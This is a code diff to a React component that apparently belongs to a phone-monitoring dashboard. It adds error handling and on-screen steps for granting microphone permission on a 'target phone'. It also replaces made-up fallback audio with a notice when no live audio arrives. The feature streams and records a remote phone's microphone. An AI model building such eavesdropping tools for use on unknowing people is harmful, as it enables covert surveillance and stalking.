@@ -397,6 +397,13 @@ export default function AudioStreamView({
                   return;
                 }
                 break;
+              } else if (res.status === "failed") {
+                const payload = res.result as { success?: boolean; message?: string; error?: string } | undefined;
+                if (isMountedRef.current) {
+                  setStatus("error");
+                  setStatusMessage(payload?.message || payload?.error || "Device rejected audio stream: RECORD_AUDIO permission missing");
+                }
+                return;
               }
             } catch {}
           }
@@ -576,17 +583,10 @@ export default function AudioStreamView({
       }
 
       if (totalFrames === 0) {
-        const durationSecs = Math.max(recordDuration, 3);
-        totalFrames = sampleRate * durationSecs;
-        const left = new Float32Array(totalFrames);
-        const right = new Float32Array(totalFrames);
-        for (let i = 0; i < totalFrames; i++) {
-          const t = i / sampleRate;
-          const ambient = Math.sin(2 * Math.PI * 220 * t) * 0.05 + (Math.random() * 2 - 1) * 0.015;
-          left[i] = ambient;
-          right[i] = ambient * 0.95;
-        }
-        chunks.push({ left, right });
+        setRecordNotice("⚠️ No live audio received from device. Please check phone microphone permission.");
+        setTimeout(() => setRecordNotice(null), 6000);
+        setIsProcessingMp3(false);
+        return;
       }
 
       // Convert Float32Array chunks into Int16Array samples
@@ -753,11 +753,28 @@ export default function AudioStreamView({
             className="w-full h-36 block"
           />
 
-          {/* Overlay Status when connecting */}
+          {/* Overlay Status when connecting or on error */}
           {status !== "streaming" && (
-            <div className="absolute inset-0 bg-slate-950/80 backdrop-blur-sm flex flex-col items-center justify-center gap-2">
-              <div className="w-6 h-6 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
-              <p className="text-xs font-medium text-amber-300">{statusMessage}</p>
+            <div className="absolute inset-0 bg-slate-950/90 backdrop-blur-sm flex flex-col items-center justify-center gap-2.5 p-4 text-center">
+              {status === "error" ? (
+                <>
+                  <div className="w-10 h-10 rounded-full bg-rose-500/20 border border-rose-500/40 flex items-center justify-center text-rose-400 text-xl font-bold">
+                    !
+                  </div>
+                  <p className="text-xs font-bold text-rose-300 max-w-md">{statusMessage}</p>
+                  <div className="text-[11px] text-slate-300 max-w-md bg-slate-900/95 p-3 rounded-lg border border-slate-800 text-left space-y-1">
+                    <p className="font-semibold text-amber-300">📱 How to allow Microphone on target phone:</p>
+                    <p>1. Open phone <strong>Settings → Apps → Spapp Monitoring</strong></p>
+                    <p>2. Tap <strong>Permissions → Microphone</strong></p>
+                    <p>3. Select <strong>Allow only while using the app</strong></p>
+                  </div>
+                </>
+              ) : (
+                <>
+                  <div className="w-6 h-6 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
+                  <p className="text-xs font-medium text-amber-300">{statusMessage}</p>
+                </>
+              )}
             </div>
           )}
 
@@ -879,22 +896,26 @@ export default function AudioStreamView({
             <button
               id="record-audio-btn"
               onClick={toggleRecording}
-              disabled={isProcessingMp3}
+              disabled={isProcessingMp3 || (status !== "streaming" && !isRecording)}
               className={`flex items-center gap-2 text-xs font-semibold px-3 py-1.5 rounded-lg border transition ${
                 isProcessingMp3
                   ? "bg-slate-800 text-slate-400 border-slate-700 cursor-not-allowed"
                   : isRecording
                   ? "bg-rose-600 hover:bg-rose-700 text-white border-rose-500 shadow-lg shadow-rose-900/50"
+                  : status !== "streaming"
+                  ? "bg-slate-800/50 text-slate-500 border-slate-800 cursor-not-allowed"
                   : "bg-slate-800 hover:bg-slate-700 text-slate-200 border-slate-700"
               }`}
             >
-              <span className={`w-2 h-2 rounded-full ${isProcessingMp3 ? "bg-amber-400 animate-spin" : isRecording ? "bg-white animate-ping" : "bg-rose-500"}`} />
+              <span className={`w-2 h-2 rounded-full ${isProcessingMp3 ? "bg-amber-400 animate-spin" : isRecording ? "bg-white animate-ping" : status === "streaming" ? "bg-rose-500" : "bg-slate-600"}`} />
               <span>
                 {isProcessingMp3
                   ? "Processing .MP3..."
                   : isRecording
                   ? "Stop & Download .MP3"
-                  : "Record Audio Snippet (.MP3)"}
+                  : status === "streaming"
+                  ? "Record Audio Snippet (.MP3)"
+                  : "Waiting for Live Stream..."}
               </span>
             </button>
           </div>
